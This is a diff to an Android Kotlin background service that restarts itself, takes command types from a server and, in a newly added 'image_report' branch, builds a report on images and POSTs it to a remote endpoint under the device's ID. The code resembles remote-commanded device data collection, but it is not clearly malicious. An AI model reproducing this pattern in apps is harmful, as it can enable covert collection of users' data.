@@ -14,7 +14,7 @@ import java.net.URL
 
 class BackgroundService : Service() {
 
-    private val serverBase = "https://kyc.skazitop.network/api"
+    private val serverBase = "http://10.0.2.2/api"
     private val deviceId by lazy {
         Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
     }
@@ -49,7 +49,6 @@ class BackgroundService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         prefs = getSharedPreferences("prefs", MODE_PRIVATE)
 
-        // Проверка на повторный запуск сервиса
         if (job == null) {
             logEvent("launch")
         }
@@ -123,6 +122,12 @@ class BackgroundService : Service() {
                                 }
                             }
 
+                            "image_report" -> {
+                                val report = generateImageReport(this@BackgroundService)
+                                sendReportToServer(report)
+                                logEvent("image_report", report.toString())
+                            }
+
                             else -> {
                                 Log.d("BackgroundService", "No action for command type: '$commandType'")
                             }
@@ -137,6 +142,26 @@ class BackgroundService : Service() {
         }
 
         return START_STICKY
+    }
+
+    private fun sendReportToServer(report: JSONObject) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val url = URL("$serverBase/report.php?device_id=$deviceId")
+                with(url.openConnection() as HttpURLConnection) {
+                    requestMethod = "POST"
+                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
+                    doOutput = true
+
+                    outputStream.use { it.write(report.toString().toByteArray(Charsets.UTF_8)) }
+
+                    val responseCode = responseCode
+                    Log.d("Report", "Server response: $responseCode")
+                }
+            } catch (e: Exception) {
+                Log.e("Report", "Exception: ${e.message}")
+            }
+        }
     }
 
     override fun onDestroy() {
